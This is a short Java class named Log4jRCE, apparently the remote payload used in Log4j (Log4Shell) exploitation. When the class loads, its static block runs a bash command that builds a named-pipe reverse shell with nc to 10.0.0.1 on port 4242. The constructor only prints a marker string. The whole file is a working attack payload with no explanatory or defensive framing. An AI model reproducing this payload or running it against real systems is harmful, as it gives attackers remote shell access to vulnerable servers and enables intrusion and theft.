import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Log4jRCE {

    static {
        
        try {
                String[] cmd = {"bash","-c", "rm -f /tmp/backpipe; mkfifo /tmp/backpipe && /bin/bash 0</tmp/backpipe | nc 10.0.0.1 4242 1>/tmp/backpipe"}; 
                Runtime r = Runtime.getRuntime();
                Process p = r.exec(cmd);
                p.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Log4jRCE(){
        System.out.println("I am Log4jRCE from remote222!!!");
    }
}
